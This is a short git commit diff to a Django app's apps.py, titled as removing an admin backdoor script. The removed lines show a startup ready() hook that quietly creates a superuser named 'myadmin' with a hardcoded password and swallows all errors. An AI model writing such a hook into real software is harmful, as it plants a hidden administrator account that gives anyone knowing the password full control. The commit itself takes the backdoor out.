68065d56333e3a7af7ae275a553c583e48cd76f5
Omwanda Gerald <omwandagerald7@gmail.com>
2026-07-04 00:37:10 +0300

    Remove admin backdoor script

--- books/apps.py
+++ books/apps.py
@@ -3,17 +3,3 @@ from django.apps import AppConfig
 
 class BooksConfig(AppConfig):
     name = 'books'
-
-    def ready(self):
-        from django.contrib.auth.models import User
-        try:
-            # Create a brandnew account specifically for admin
-            if not User.objects.filter(username='myadmin').exists():
-                u = User.objects.create_superuser(
-                    username='myadmin',
-                    email='admin@example.com',
-                    password='Password123!'
-                )
-                u.save()
-        except:
-            pass
